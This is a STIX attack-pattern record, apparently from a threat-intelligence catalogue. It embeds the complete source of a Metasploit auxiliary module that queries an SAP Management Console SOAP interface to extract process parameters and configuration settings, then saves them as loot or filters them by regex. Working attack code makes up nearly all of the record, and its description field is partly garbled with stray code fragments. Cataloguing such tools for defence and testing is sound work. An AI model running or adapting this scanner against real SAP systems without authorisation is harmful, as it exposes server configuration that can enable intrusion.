{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3e32b7b-9a6a-4d51-9db6-af8562caa2a8",
    "created": "2024-08-14T16:27:01.281674Z",
    "modified": "2024-08-14T16:27:01.281678Z",
    "name": "SAP Management Console Get Process Parameters",
    "description": " This module simply attempts to output a SAP process parameters and configuration settings through the SAP Management Console SOAP Interface.  'References'   => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter.rb",
            "external_id": "sap_mgmt_con_getprocessparameter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'SAP Management Console Get Process Parameters',\n      'Description'  => %q{\n        This module simply attempts to output a SAP process parameters and\n        configuration settings through the SAP Management Console SOAP Interface.\n        },\n      'References'   =>\n        [\n          # General\n          [ 'URL', 'https://blog.c22.cc' ]\n        ],\n      'Author'       => [ 'Chris John Riley' ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(50013),\n        OptString.new('TARGETURI', [false, 'Path to the SAP Management Console ', '/']),\n        OptString.new('MATCH', [false, 'Display matches e.g login/', '']),\n      ])\n    register_autofilter_ports([ 50013 ])\n  end\n\n  def run_host(ip)\n    getprocparam(ip)\n  end\n\n  def getprocparam(rhost)\n    print_status(\"[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}\")\n    success = false\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n    ns1 = 'ns1:GetProcessParameter'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi\n    data << '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<' + ns1 + ' xmlns:ns1=\"urn:SAPControl\"></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    begin\n      res = send_request_raw({\n        'uri'      => normalize_uri(target_uri.path),\n        'method'   => 'POST',\n        'data'     => data,\n        'headers'  =>\n          {\n            'Content-Length' => data.length,\n            'SOAPAction'     => '\"\"',\n            'Content-Type'   => 'text/xml; charset=UTF-8',\n          }\n      })\n\n      unless res\n        print_error(\"#{rhost}:#{rport} [SAP] Unable to connect\")\n        return\n      end\n\n      if res.code == 200\n        case res.body\n        when nil\n          # Nothing\n        when /<parameter>(.*)<\\/parameter>/i\n          body = []\n          body = res.body\n          success = true\n        end\n      elsif res\n        case res.body\n        when /<faultstring>(.*)<\\/faultstring>/i\n          faultcode = $1.strip\n          fault = true\n        end\n      else\n        print_error(\"#{rhost}:#{rport} [SAP] Unable to communicate with remote host.\")\n      end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to attempt authentication\")\n      return\n    end\n\n    if success\n      # Only store loot if MATCH is not selected\n      if datastore['MATCH'].blank?\n        loot = store_loot(\n          \"sap.getprocessparameters\",\n          \"text/xml\",\n          rhost,\n          res.body,\n          \".xml\"\n        )\n        print_good(\"#{rhost}:#{rport} [SAP] Process Parameters: Entries extracted to #{loot}\")\n      else\n        name_match = Regexp.new(datastore['MATCH'], Regexp::EXTENDED | Regexp::NOENCODING)\n        print_status(\"[SAP] Regex match selected, skipping loot storage\")\n        print_status(\"#{rhost}:#{rport} [SAP] Attempting to display configuration matches for #{name_match}\")\n\n        saptbl = Msf::Ui::Console::Table.new(\n          Msf::Ui::Console::Table::Style::Default,\n        'Header'    => \"[SAP] Process Parameters\",\n        'Prefix'    => \"\\n\",\n        'Indent'    => 1,\n        'Columns'   =>\n        [\n          \"Name\",\n          \"Description\",\n          \"Value\"\n        ])\n\n        xmldata = REXML::Document.new(body)\n        xmlpath = '/SOAP-ENV:Envelope/SOAP-ENV:Body/'\n        xmlpath << '/SAPControl:GetProcessParameterResponse'\n        xmlpath << '/parameter/item'\n        xmldata.elements.each(xmlpath) do | ele |\n          if not datastore['MATCH'].empty? and ele.elements[\"name\"].text.match(/#{name_match}/)\n            name = ele.elements[\"name\"].text if not ele.elements[\"name\"].nil?\n            desc = ele.elements[\"description\"].text if not ele.elements[\"description\"].nil?\n            desc = '' if desc.nil?\n            val = ele.elements[\"value\"].text if not ele.elements[\"value\"].nil?\n            val = '' if val.nil?\n            saptbl << [ name, desc, val ]\n          end\n        end\n\n        print_status(\"[SAP] Process Parameter Results for #{name_match}\\n #{saptbl.to_s}\") if not saptbl.to_s.empty?\n      end\n\n      return\n\n    elsif fault\n      print_error(\"#{rhost}:#{rport} [SAP] Error code: #{faultcode}\")\n      return\n\n    else\n      # Something has gone horribly wrong\n      print_error(\"#{rhost}:#{rport} [SAP] failed to request environment\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Chris John Riley ]",
        ""
    ]
}